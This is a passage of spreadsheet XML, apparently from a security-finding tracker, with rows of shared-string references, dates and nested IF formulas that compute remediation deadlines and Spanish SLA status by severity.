      <c r="AE312" s="65" t="s">
        <v>2975</v>
      </c>
      <c r="AG312" s="53" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="313" spans="1:33" ht="58" x14ac:dyDescent="0.35">
      <c r="A313" s="5">
        <v>312</v>
      </c>
      <c r="B313" s="50" t="s">
        <v>2044</v>
      </c>
      <c r="C313" s="50" t="s">
        <v>425</v>
      </c>
      <c r="D313" s="63" t="s">
        <v>34</v>
      </c>
      <c r="G313" s="60" t="s">
        <v>3155</v>
      </c>
      <c r="J313" t="s">
        <v>3160</v>
      </c>
      <c r="L313" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M313" s="50" t="s">
        <v>111</v>
      </c>
      <c r="Q313" t="s">
        <v>2459</v>
      </c>
      <c r="T313" s="1">
        <v>45972</v>
      </c>
      <c r="U313" s="55">
        <f t="shared" ca="1" si="46"/>
        <v>237</v>
      </c>
      <c r="V313" s="1">
        <f t="shared" si="47"/>
        <v>46092</v>
      </c>
      <c r="W313" s="56" t="str">
        <f t="shared" ca="1" si="48"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB313" t="s">
        <v>3161</v>
      </c>
      <c r="AC313" s="65" t="s">
        <v>3162</v>
      </c>
      <c r="AE313" s="65" t="s">
        <v>2975</v>
      </c>
      <c r="AG313" s="53" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="314" spans="1:33" ht="130.5" x14ac:dyDescent="0.35">
      <c r="A314" s="5">
        <v>313</v>
      </c>
      <c r="B314" s="50" t="s">
        <v>2044</v>
      </c>
      <c r="C314" s="50" t="s">
        <v>425</v>
      </c>
      <c r="D314" s="63" t="s">
        <v>34</v>
      </c>
      <c r="G314" s="60" t="s">
        <v>3155</v>
      </c>
      <c r="J314" t="s">
        <v>1483</v>
      </c>
      <c r="L314" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M314" s="50" t="s">
        <v>61</v>
      </c>
      <c r="Q314" t="s">
        <v>2459</v>
      </c>
      <c r="T314" s="1">
        <v>45972</v>
      </c>
      <c r="U314" s="55">
        <f t="shared" ca="1" si="46"/>
        <v>237</v>
      </c>
      <c r="V314" s="1">
        <f t="shared" si="47"/>
        <v>46062</v>
      </c>
      <c r="W314" s="56" t="str">
        <f t="shared" ca="1" si="48"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB314" t="s">
        <v>1487</v>
      </c>
      <c r="AC314" s="65" t="s">
        <v>3163</v>
      </c>
      <c r="AE314" s="65" t="s">
        <v>2975</v>
      </c>
      <c r="AG314" s="53" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="315" spans="1:33" ht="116" x14ac:dyDescent="0.35">
      <c r="A315" s="5">
        <v>314</v>
      </c>
      <c r="B315" s="50" t="s">
        <v>2044</v>
      </c>
      <c r="C315" s="50" t="s">
        <v>425</v>
      </c>
      <c r="D315" s="63" t="s">
        <v>34</v>
      </c>
      <c r="G315" s="60" t="s">
        <v>3155</v>
      </c>
      <c r="J315" t="s">
        <v>3164</v>
      </c>
      <c r="L315" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M315" s="50" t="s">
        <v>111</v>
      </c>
      <c r="Q315" t="s">
        <v>2869</v>
      </c>
      <c r="T315" s="1">
        <v>45940</v>
      </c>
      <c r="U315" s="55">
        <f t="shared" ca="1" si="46"/>
        <v>269</v>
      </c>
      <c r="V315" s="1">
        <f t="shared" si="47"/>
        <v>46060</v>
      </c>
      <c r="W315" s="56" t="str">
        <f t="shared" ca="1" si="48"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB315" t="s">
        <v>3157</v>
      </c>
      <c r="AC315" s="65" t="s">
        <v>3158</v>
      </c>
      <c r="AE315" s="65" t="s">
        <v>2975</v>
      </c>
      <c r="AG315" s="53" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="316" spans="1:33" ht="217.5" x14ac:dyDescent="0.35">
      <c r="A316" s="5">
        <v>315</v>
      </c>
      <c r="B316" s="50" t="s">
        <v>2044</v>
      </c>
      <c r="C316" s="50" t="s">
        <v>425</v>
      </c>
      <c r="D316" s="63" t="s">
        <v>34</v>
      </c>
      <c r="G316" s="60" t="s">
        <v>3155</v>
      </c>
      <c r="J316" t="s">
        <v>1486</v>
      </c>
      <c r="L316" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M316" s="50" t="s">
        <v>111</v>
      </c>
      <c r="Q316" t="s">
        <v>2869</v>
      </c>
      <c r="T316" s="1">
        <v>45960</v>
      </c>
      <c r="U316" s="55">
        <f t="shared" ca="1" si="46"/>
        <v>249</v>
      </c>
      <c r="V316" s="1">
        <f t="shared" si="47"/>
        <v>46080</v>
      </c>
      <c r="W316" s="56" t="str">
        <f t="shared" ca="1" si="48"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB316" t="s">
        <v>1810</v>
      </c>
      <c r="AC316" s="65" t="s">
        <v>3159</v>
      </c>
      <c r="AE316" s="65" t="s">
        <v>2975</v>
      </c>
      <c r="AG316" s="53" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="317" spans="1:33" ht="58" x14ac:dyDescent="0.35">
      <c r="A317" s="5">
        <v>316</v>
      </c>
      <c r="B317" s="50" t="s">
        <v>2044</v>
      </c>
      <c r="C317" s="50" t="s">
        <v>425</v>
      </c>
      <c r="D317" s="63" t="s">
        <v>34</v>
      </c>
      <c r="G317" s="60" t="s">
        <v>3155</v>
      </c>
      <c r="J317" t="s">
        <v>3160</v>
      </c>
      <c r="L317" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M317" s="50" t="s">
        <v>111</v>
      </c>
      <c r="Q317" t="s">
        <v>2869</v>
      </c>
      <c r="T317" s="1">
        <v>45960</v>
      </c>
      <c r="U317" s="55">
        <f t="shared" ca="1" si="46"/>
        <v>249</v>
      </c>
      <c r="V317" s="1">
        <f t="shared" si="47"/>
        <v>46080</v>
      </c>
      <c r="W317" s="56" t="str">
        <f t="shared" ca="1" si="48"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB317" t="s">
        <v>3161</v>
      </c>
      <c r="AC317" s="65" t="s">
        <v>3162</v>
      </c>
      <c r="AE317" s="65" t="s">
        <v>2975</v>
      </c>
      <c r="AG317" s="53" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="318" spans="1:33" ht="130.5" x14ac:dyDescent="0.35">
      <c r="A318" s="5">
        <v>317</v>
      </c>
      <c r="B318" s="50" t="s">
        <v>2044</v>
      </c>
      <c r="C318" s="50" t="s">
        <v>425</v>
      </c>
      <c r="D318" s="63" t="s">
        <v>34</v>
      </c>
      <c r="G318" s="60" t="s">
        <v>3155</v>
      </c>
      <c r="J318" t="s">
        <v>1483</v>
      </c>
      <c r="L318" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M318" s="50" t="s">
        <v>61</v>
      </c>
      <c r="Q318" t="s">
        <v>2869</v>
      </c>
      <c r="T318" s="1">
        <v>45960</v>
      </c>
      <c r="U318" s="55">
        <f t="shared" ca="1" si="46"/>
        <v>249</v>
      </c>
      <c r="V318" s="1">
        <f t="shared" si="47"/>
        <v>46050</v>
      </c>
      <c r="W318" s="56" t="str">
        <f t="shared" ca="1" si="48"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB318" t="s">
        <v>1487</v>
      </c>
      <c r="AC318" s="65" t="s">
        <v>3163</v>
      </c>
      <c r="AE318" s="65" t="s">
        <v>2975</v>
      </c>
      <c r="AG318" s="53" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="319" spans="1:33" ht="43.5" x14ac:dyDescent="0.35">
      <c r="A319" s="5">
        <v>318</v>
      </c>
      <c r="B319" s="50" t="s">
        <v>2044</v>
      </c>
      <c r="C319" s="50" t="s">
        <v>425</v>
      </c>
      <c r="D319" s="63" t="s">
        <v>34</v>
      </c>
      <c r="G319" s="60" t="s">
        <v>3155</v>
      </c>
      <c r="J319" t="s">
        <v>2871</v>
      </c>
      <c r="L319" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M319" s="50" t="s">
        <v>61</v>
      </c>
      <c r="Q319" t="s">
        <v>2869</v>
      </c>
      <c r="T319" s="1">
        <v>45552</v>
      </c>
      <c r="U319" s="55">
        <f t="shared" ca="1" si="46"/>
        <v>657</v>
      </c>
      <c r="V319" s="1">
        <f t="shared" si="47"/>
        <v>45642</v>
      </c>
      <c r="W319" s="56" t="str">
        <f t="shared" ca="1" si="48"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB319" t="s">
        <v>2871</v>
      </c>
      <c r="AC319" s="65" t="s">
        <v>3165</v>
      </c>
      <c r="AE319" s="65" t="s">
        <v>2975</v>
      </c>
      <c r="AG319" s="53" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="320" spans="1:33" ht="72.5" x14ac:dyDescent="0.35">
      <c r="A320" s="50">
        <v>319</v>
      </c>
      <c r="B320" s="50" t="s">
        <v>2044</v>
      </c>
      <c r="C320" s="50" t="s">
        <v>33</v>
      </c>
      <c r="D320" s="63" t="s">
        <v>34</v>
      </c>
      <c r="G320" s="60" t="s">
        <v>3480</v>
      </c>
      <c r="H320" t="s">
        <v>3602</v>
      </c>
      <c r="I320" t="s">
        <v>3484</v>
      </c>
      <c r="J320" s="65" t="s">
        <v>890</v>
      </c>
      <c r="L320" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M320" s="50" t="s">
        <v>61</v>
      </c>
      <c r="Q320" t="s">
        <v>3483</v>
      </c>
      <c r="T320" s="1">
        <v>46085</v>
      </c>
      <c r="U320" s="55">
        <f t="shared" ca="1" si="46"/>
        <v>124</v>
      </c>
      <c r="V320" s="1">
        <f t="shared" si="47"/>
        <v>46175</v>
      </c>
      <c r="W320" s="56" t="str">
        <f t="shared" ca="1" si="48"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB320" s="65" t="s">
        <v>1573</v>
      </c>
      <c r="AC320" s="65" t="s">
        <v>3489</v>
      </c>
      <c r="AD320" s="65" t="s">
        <v>3488</v>
      </c>
      <c r="AE320" s="65" t="s">
        <v>2975</v>
      </c>
      <c r="AG320" s="53" t="s">
        <v>3498</v>
      </c>
    </row>
    <row r="321" spans="1:33" ht="174" x14ac:dyDescent="0.35">
      <c r="A321" s="50">
        <v>320</v>
      </c>
      <c r="B321" s="50" t="s">
        <v>2044</v>
      </c>
      <c r="C321" s="50" t="s">
        <v>33</v>
      </c>
      <c r="D321" s="63" t="s">
        <v>34</v>
      </c>
      <c r="G321" s="60" t="s">
        <v>3480</v>
      </c>
      <c r="H321" t="s">
        <v>3603</v>
      </c>
      <c r="I321" t="s">
        <v>3485</v>
      </c>
      <c r="J321" t="s">
        <v>3481</v>
      </c>
      <c r="L321" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M321" s="50" t="s">
        <v>61</v>
      </c>
      <c r="Q321" t="s">
        <v>3483</v>
      </c>
      <c r="T321" s="1">
        <v>46085</v>
      </c>
      <c r="U321" s="55">
        <f t="shared" ref="U321:U323" ca="1" si="49">TODAY()-T321</f>
        <v>124</v>
      </c>
      <c r="V321" s="1">
        <f t="shared" ref="V321:V323" si="50">IF(M321="Critical",T321+10,IF(M321="High",T321+30,IF(M321="Bad",T321+30,IF(M321="Medium",T321+90,IF(M321="Warm",T321+90,IF(M321="Low",T321+120,IF(M321="Fair",T321+120,IF(M321="Neutral",T321+120,""))))))))</f>
        <v>46175</v>
      </c>
      <c r="W321" s="56" t="str">
        <f t="shared" ref="W321:W323" ca="1" si="51">IF(M321="Critical",IF(U321&gt;10,"SLA Vencido","En SLA"),IF(M321="High",IF(U321&gt;30,"SLA Vencido","En SLA"),IF(M321="Bad",IF(U321&gt;30,"SLA Vencido","En SLA"),IF(M321="Medium",IF(U321&gt;90,"SLA Vencido","En SLA"),IF(M321="Warm",IF(U321&gt;90,"SLA Vencido","En SLA"),IF(M321="Low",IF(U321&gt;120,"SLA Vencido","En SLA"),IF(M321="Fair",IF(U321&gt;120,"SLA Vencido","En SLA"),IF(M321="Neutral",IF(U321&gt;120,"SLA Vencido","En SLA"),"Error"))))))))</f>
        <v>SLA Vencido</v>
      </c>
      <c r="AB321" s="65" t="s">
        <v>3490</v>
      </c>
      <c r="AC321" s="65" t="s">
        <v>3492</v>
      </c>
      <c r="AD321" s="65" t="s">
        <v>3491</v>
      </c>
      <c r="AE321" s="65" t="s">
        <v>2975</v>
      </c>
      <c r="AG321" s="53" t="s">
        <v>3498</v>
      </c>
    </row>
    <row r="322" spans="1:33" ht="72.5" x14ac:dyDescent="0.35">
      <c r="A322" s="50">
        <v>321</v>
      </c>
      <c r="B322" s="50" t="s">
        <v>2044</v>
      </c>
      <c r="C322" s="50" t="s">
        <v>33</v>
      </c>
      <c r="D322" s="63" t="s">
        <v>34</v>
      </c>
      <c r="G322" s="60" t="s">
        <v>3480</v>
      </c>
      <c r="I322" t="s">
        <v>3486</v>
      </c>
      <c r="J322" t="s">
        <v>3482</v>
      </c>
      <c r="L322" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M322" s="50" t="s">
        <v>111</v>
      </c>
      <c r="Q322" t="s">
        <v>3483</v>
      </c>
      <c r="T322" s="1">
        <v>46085</v>
      </c>
      <c r="U322" s="55">
        <f t="shared" ca="1" si="49"/>
        <v>124</v>
      </c>
      <c r="V322" s="1">
        <f t="shared" si="50"/>
        <v>46205</v>
      </c>
      <c r="W322" s="56" t="str">
        <f t="shared" ca="1" si="51"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB322" s="65" t="s">
        <v>3493</v>
      </c>
      <c r="AC322" s="65" t="s">
        <v>3495</v>
      </c>
      <c r="AD322" s="65" t="s">
        <v>3494</v>
      </c>
      <c r="AG322" s="53" t="s">
        <v>3498</v>
      </c>
    </row>
    <row r="323" spans="1:33" ht="101.5" x14ac:dyDescent="0.35">
      <c r="A323" s="50">
        <v>322</v>
      </c>
      <c r="B323" s="50" t="s">
        <v>2044</v>
      </c>
      <c r="C323" s="50" t="s">
        <v>33</v>
      </c>
      <c r="D323" s="63" t="s">
        <v>34</v>
      </c>
      <c r="G323" s="60" t="s">
        <v>3480</v>
      </c>
      <c r="I323" t="s">
        <v>3487</v>
      </c>
      <c r="J323" t="s">
        <v>1233</v>
      </c>
      <c r="L323" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M323" s="50" t="s">
        <v>111</v>
      </c>
      <c r="Q323" t="s">
        <v>3483</v>
      </c>
      <c r="T323" s="1">
        <v>46085</v>
      </c>
      <c r="U323" s="55">
        <f t="shared" ca="1" si="49"/>
        <v>124</v>
      </c>
      <c r="V323" s="1">
        <f t="shared" si="50"/>
        <v>46205</v>
      </c>
      <c r="W323" s="56" t="str">
        <f t="shared" ca="1" si="51"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB323" s="65" t="s">
        <v>3496</v>
      </c>
      <c r="AC323" s="65" t="s">
        <v>3497</v>
      </c>
      <c r="AD323" s="65" t="s">
        <v>1236</v>
      </c>
      <c r="AE323" s="65" t="s">
        <v>2975</v>
      </c>
      <c r="AG323" s="53" t="s">
        <v>3498</v>
      </c>
    </row>
    <row r="324" spans="1:33" ht="58" x14ac:dyDescent="0.35">
      <c r="A324" s="50">
        <v>323</v>
      </c>
      <c r="B324" s="50" t="s">
        <v>2044</v>
      </c>
      <c r="C324" s="50" t="s">
        <v>225</v>
      </c>
      <c r="D324" s="63" t="s">
        <v>34</v>
      </c>
      <c r="G324" s="60" t="s">
        <v>3501</v>
      </c>
      <c r="H324" t="s">
        <v>3502</v>
      </c>
      <c r="J324" t="s">
        <v>1975</v>
      </c>
      <c r="L324" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M324" s="50" t="s">
        <v>522</v>
      </c>
      <c r="Q324" t="s">
        <v>3512</v>
      </c>
      <c r="T324" s="1">
        <v>46085</v>
      </c>
      <c r="U324" s="55">
        <f t="shared" ref="U324:U332" ca="1" si="52">TODAY()-T324</f>
        <v>124</v>
      </c>
      <c r="V324" s="1">
        <f t="shared" ref="V324:V332" si="53">IF(M324="Critical",T324+10,IF(M324="High",T324+30,IF(M324="Bad",T324+30,IF(M324="Medium",T324+90,IF(M324="Warm",T324+90,IF(M324="Low",T324+120,IF(M324="Fair",T324+120,IF(M324="Neutral",T324+120,""))))))))</f>
        <v>46115</v>
      </c>
      <c r="W324" s="56" t="str">
        <f t="shared" ref="W324:W332" ca="1" si="54">IF(M324="Critical",IF(U324&gt;10,"SLA Vencido","En SLA"),IF(M324="High",IF(U324&gt;30,"SLA Vencido","En SLA"),IF(M324="Bad",IF(U324&gt;30,"SLA Vencido","En SLA"),IF(M324="Medium",IF(U324&gt;90,"SLA Vencido","En SLA"),IF(M324="Warm",IF(U324&gt;90,"SLA Vencido","En SLA"),IF(M324="Low",IF(U324&gt;120,"SLA Vencido","En SLA"),IF(M324="Fair",IF(U324&gt;120,"SLA Vencido","En SLA"),IF(M324="Neutral",IF(U324&gt;120,"SLA Vencido","En SLA"),"Error"))))))))</f>
        <v>SLA Vencido</v>
      </c>
      <c r="AB324" s="65" t="s">
        <v>1975</v>
      </c>
      <c r="AD324" s="65" t="s">
        <v>1976</v>
      </c>
      <c r="AE324" s="65" t="s">
        <v>2975</v>
      </c>
      <c r="AG324" s="53" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="325" spans="1:33" ht="58" x14ac:dyDescent="0.35">
      <c r="A325" s="50">
        <v>324</v>
      </c>
      <c r="B325" s="50" t="s">
        <v>2044</v>
      </c>
      <c r="C325" s="50" t="s">
        <v>225</v>
      </c>
      <c r="D325" s="63" t="s">
        <v>34</v>
      </c>
      <c r="G325" s="60" t="s">
        <v>3501</v>
      </c>
      <c r="H325" t="s">
        <v>3503</v>
      </c>
      <c r="J325" t="s">
        <v>1975</v>
      </c>
      <c r="L325" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M325" s="50" t="s">
        <v>522</v>
      </c>
      <c r="Q325" t="s">
        <v>3513</v>
      </c>
      <c r="T325" s="1">
        <v>46085</v>
      </c>
      <c r="U325" s="55">
        <f t="shared" ca="1" si="52"/>
        <v>124</v>
      </c>
      <c r="V325" s="1">
        <f t="shared" si="53"/>
        <v>46115</v>
      </c>
      <c r="W325" s="56" t="str">
        <f t="shared" ca="1" si="54"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB325" s="65" t="s">
        <v>1975</v>
      </c>
      <c r="AD325" s="65" t="s">
        <v>1976</v>
      </c>
      <c r="AE325" s="65" t="s">
        <v>2975</v>
      </c>
      <c r="AG325" s="53" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="326" spans="1:33" ht="58" x14ac:dyDescent="0.35">
      <c r="A326" s="50">
        <v>325</v>
      </c>
      <c r="B326" s="50" t="s">
        <v>2044</v>
      </c>
      <c r="C326" s="50" t="s">
        <v>225</v>
      </c>
      <c r="D326" s="63" t="s">
        <v>34</v>
      </c>
      <c r="G326" s="60" t="s">
        <v>3501</v>
      </c>
      <c r="H326" t="s">
        <v>3504</v>
      </c>
      <c r="J326" t="s">
        <v>1975</v>
      </c>
      <c r="L326" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M326" s="50" t="s">
        <v>522</v>
      </c>
      <c r="Q326" t="s">
        <v>3514</v>
      </c>
      <c r="T326" s="1">
        <v>46085</v>
      </c>
      <c r="U326" s="55">
        <f t="shared" ca="1" si="52"/>
        <v>124</v>
      </c>
      <c r="V326" s="1">
        <f t="shared" si="53"/>
        <v>46115</v>
      </c>
      <c r="W326" s="56" t="str">
        <f t="shared" ca="1" si="54"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB326" s="65" t="s">
        <v>1975</v>
      </c>
      <c r="AD326" s="65" t="s">
        <v>1976</v>
      </c>
      <c r="AE326" s="65" t="s">
        <v>2975</v>
      </c>
      <c r="AG326" s="53" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="327" spans="1:33" ht="58" x14ac:dyDescent="0.35">
      <c r="A327" s="50">
        <v>326</v>
      </c>
      <c r="B327" s="50" t="s">
        <v>2044</v>
      </c>
      <c r="C327" s="50" t="s">
        <v>225</v>
      </c>
      <c r="D327" s="63" t="s">
        <v>34</v>
      </c>
      <c r="G327" s="60" t="s">
        <v>3501</v>
      </c>
      <c r="H327" t="s">
        <v>3505</v>
      </c>
      <c r="J327" t="s">
        <v>1975</v>
      </c>
      <c r="L327" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M327" s="50" t="s">
        <v>522</v>
      </c>
      <c r="Q327" t="s">
        <v>3515</v>
      </c>
      <c r="T327" s="1">
        <v>46085</v>
      </c>
      <c r="U327" s="55">
        <f t="shared" ca="1" si="52"/>
        <v>124</v>
      </c>
      <c r="V327" s="1">
        <f t="shared" si="53"/>
        <v>46115</v>
      </c>
      <c r="W327" s="56" t="str">
        <f t="shared" ca="1" si="54"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB327" s="65" t="s">
        <v>1975</v>
      </c>
      <c r="AD327" s="65" t="s">
        <v>1976</v>
      </c>
      <c r="AE327" s="65" t="s">
        <v>2975</v>
      </c>
      <c r="AG327" s="53" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="328" spans="1:33" ht="203" x14ac:dyDescent="0.35">
      <c r="A328" s="50">
        <v>327</v>
      </c>
      <c r="B328" s="50" t="s">
        <v>2044</v>
      </c>
      <c r="C328" s="50" t="s">
        <v>225</v>
      </c>
      <c r="D328" s="63" t="s">
        <v>34</v>
      </c>
      <c r="G328" s="60" t="s">
        <v>3501</v>
      </c>
      <c r="H328" t="s">
        <v>3506</v>
      </c>
      <c r="J328" t="s">
        <v>3511</v>
      </c>
      <c r="L328" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M328" s="50" t="s">
        <v>61</v>
      </c>
      <c r="Q328" t="s">
        <v>3516</v>
      </c>
      <c r="T328" s="1">
        <v>46085</v>
      </c>
      <c r="U328" s="55">
        <f t="shared" ca="1" si="52"/>
        <v>124</v>
      </c>
      <c r="V328" s="1">
        <f t="shared" si="53"/>
        <v>46175</v>
      </c>
      <c r="W328" s="56" t="str">
        <f t="shared" ca="1" si="54"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB328" s="65" t="s">
        <v>3511</v>
      </c>
      <c r="AD328" s="65" t="s">
        <v>3518</v>
      </c>
      <c r="AE328" s="65" t="s">
        <v>2975</v>
      </c>
      <c r="AG328" s="53" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="329" spans="1:33" ht="203" x14ac:dyDescent="0.35">
      <c r="A329" s="50">
        <v>328</v>
      </c>
      <c r="B329" s="50" t="s">
        <v>2044</v>
      </c>
      <c r="C329" s="50" t="s">
        <v>225</v>
      </c>
      <c r="D329" s="63" t="s">
        <v>34</v>
      </c>
      <c r="G329" s="60" t="s">
        <v>3501</v>
      </c>
      <c r="H329" t="s">
        <v>3507</v>
      </c>
      <c r="J329" t="s">
        <v>3511</v>
      </c>
      <c r="L329" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M329" s="50" t="s">
        <v>61</v>
      </c>
      <c r="Q329" t="s">
        <v>3517</v>
      </c>
      <c r="T329" s="1">
        <v>46085</v>
      </c>
      <c r="U329" s="55">
        <f t="shared" ca="1" si="52"/>
        <v>124</v>
      </c>
      <c r="V329" s="1">
        <f t="shared" si="53"/>
        <v>46175</v>
      </c>
      <c r="W329" s="56" t="str">
        <f t="shared" ca="1" si="54"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB329" s="65" t="s">
        <v>3511</v>
      </c>
      <c r="AD329" s="65" t="s">
        <v>3518</v>
      </c>
      <c r="AE329" s="65" t="s">
        <v>2975</v>
      </c>
      <c r="AG329" s="53" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="330" spans="1:33" ht="203" x14ac:dyDescent="0.35">
      <c r="A330" s="50">
        <v>329</v>
      </c>
      <c r="B330" s="50" t="s">
        <v>2044</v>
      </c>
      <c r="C330" s="50" t="s">
        <v>225</v>
      </c>
      <c r="D330" s="63" t="s">
        <v>34</v>
      </c>
      <c r="G330" s="60" t="s">
        <v>3501</v>
      </c>
      <c r="H330" t="s">
        <v>3508</v>
      </c>
      <c r="J330" t="s">
        <v>3511</v>
      </c>
      <c r="L330" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M330" s="50" t="s">
        <v>61</v>
      </c>
      <c r="Q330" t="s">
        <v>3517</v>
      </c>
      <c r="T330" s="1">
        <v>46085</v>
      </c>
      <c r="U330" s="55">
        <f t="shared" ca="1" si="52"/>
        <v>124</v>
      </c>
      <c r="V330" s="1">
        <f t="shared" si="53"/>
        <v>46175</v>
      </c>
      <c r="W330" s="56" t="str">
        <f t="shared" ca="1" si="54"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB330" s="65" t="s">
        <v>3511</v>
      </c>
      <c r="AD330" s="65" t="s">
        <v>3518</v>
      </c>
      <c r="AE330" s="65" t="s">
        <v>2975</v>
      </c>
      <c r="AG330" s="53" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="331" spans="1:33" ht="203" x14ac:dyDescent="0.35">
      <c r="A331" s="50">
        <v>330</v>
      </c>
      <c r="B331" s="50" t="s">
        <v>2044</v>
      </c>
      <c r="C331" s="50" t="s">
        <v>225</v>
      </c>
      <c r="D331" s="63" t="s">
        <v>34</v>
      </c>
      <c r="G331" s="60" t="s">
        <v>3501</v>
      </c>
      <c r="H331" t="s">
        <v>3509</v>
      </c>
      <c r="J331" t="s">
        <v>3511</v>
      </c>
      <c r="L331" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M331" s="50" t="s">
        <v>61</v>
      </c>
      <c r="Q331" t="s">
        <v>3517</v>
      </c>
      <c r="T331" s="1">
        <v>46085</v>
      </c>
      <c r="U331" s="55">
        <f t="shared" ca="1" si="52"/>
        <v>124</v>
      </c>
      <c r="V331" s="1">
        <f t="shared" si="53"/>
        <v>46175</v>
      </c>
      <c r="W331" s="56" t="str">
        <f t="shared" ca="1" si="54"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB331" s="65" t="s">
        <v>3511</v>
      </c>
      <c r="AD331" s="65" t="s">
        <v>3518</v>
      </c>
      <c r="AE331" s="65" t="s">
        <v>2975</v>
      </c>
      <c r="AG331" s="53" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="332" spans="1:33" ht="203" x14ac:dyDescent="0.35">
      <c r="A332" s="50">
        <v>331</v>
      </c>
      <c r="B332" s="50" t="s">
        <v>2044</v>
      </c>
      <c r="C332" s="50" t="s">
        <v>225</v>
      </c>
      <c r="D332" s="63" t="s">
        <v>34</v>
      </c>
      <c r="G332" s="60" t="s">
        <v>3501</v>
      </c>
      <c r="H332" t="s">
        <v>3510</v>
      </c>
      <c r="J332" t="s">
        <v>3511</v>
      </c>
      <c r="L332" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M332" s="50" t="s">
        <v>61</v>
      </c>
      <c r="Q332" t="s">
        <v>3517</v>
      </c>
      <c r="T332" s="1">
        <v>46085</v>
      </c>
      <c r="U332" s="55">
        <f t="shared" ca="1" si="52"/>
        <v>124</v>
      </c>
      <c r="V332" s="1">
        <f t="shared" si="53"/>
        <v>46175</v>
      </c>
      <c r="W332" s="56" t="str">
        <f t="shared" ca="1" si="54"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB332" s="65" t="s">
        <v>3511</v>
      </c>
      <c r="AD332" s="65" t="s">
        <v>3518</v>
      </c>
      <c r="AE332" s="65" t="s">
        <v>2975</v>
      </c>
      <c r="AG332" s="53" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="333" spans="1:33" ht="72.5" x14ac:dyDescent="0.35">
      <c r="A333" s="50">
        <v>332</v>
      </c>
      <c r="B333" s="50" t="s">
        <v>2044</v>
      </c>
      <c r="C333" s="50" t="s">
        <v>33</v>
      </c>
      <c r="D333" s="63" t="s">
        <v>34</v>
      </c>
      <c r="G333" s="60" t="s">
        <v>2096</v>
      </c>
      <c r="H333" t="s">
        <v>3663</v>
      </c>
      <c r="I333" t="s">
        <v>3665</v>
      </c>
      <c r="J333" t="s">
        <v>3667</v>
      </c>
      <c r="L333" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M333" s="50" t="s">
        <v>61</v>
      </c>
      <c r="N333">
        <v>4.8</v>
      </c>
      <c r="Q333" t="s">
        <v>3668</v>
      </c>
      <c r="T333" s="1">
        <v>46134</v>
      </c>
      <c r="U333" s="55">
        <f t="shared" ref="U333:U336" ca="1" si="55">TODAY()-T333</f>
        <v>75</v>
      </c>
      <c r="V333" s="1">
        <f t="shared" ref="V333:V336" si="56">IF(M333="Critical",T333+10,IF(M333="High",T333+30,IF(M333="Bad",T333+30,IF(M333="Medium",T333+90,IF(M333="Warm",T333+90,IF(M333="Low",T333+120,IF(M333="Fair",T333+120,IF(M333="Neutral",T333+120,""))))))))</f>
        <v>46224</v>
      </c>
      <c r="W333" s="56" t="str">
        <f t="shared" ref="W333:W336" ca="1" si="57">IF(M333="Critical",IF(U333&gt;10,"SLA Vencido","En SLA"),IF(M333="High",IF(U333&gt;30,"SLA Vencido","En SLA"),IF(M333="Bad",IF(U333&gt;30,"SLA Vencido","En SLA"),IF(M333="Medium",IF(U333&gt;90,"SLA Vencido","En SLA"),IF(M333="Warm",IF(U333&gt;90,"SLA Vencido","En SLA"),IF(M333="Low",IF(U333&gt;120,"SLA Vencido","En SLA"),IF(M333="Fair",IF(U333&gt;120,"SLA Vencido","En SLA"),IF(M333="Neutral",IF(U333&gt;120,"SLA Vencido","En SLA"),"Error"))))))))</f>
        <v>En SLA</v>
      </c>
      <c r="AB333" s="65" t="s">
        <v>3669</v>
      </c>
      <c r="AC333" s="65" t="s">
        <v>3671</v>
      </c>
      <c r="AD333" s="65" t="s">
        <v>3670</v>
      </c>
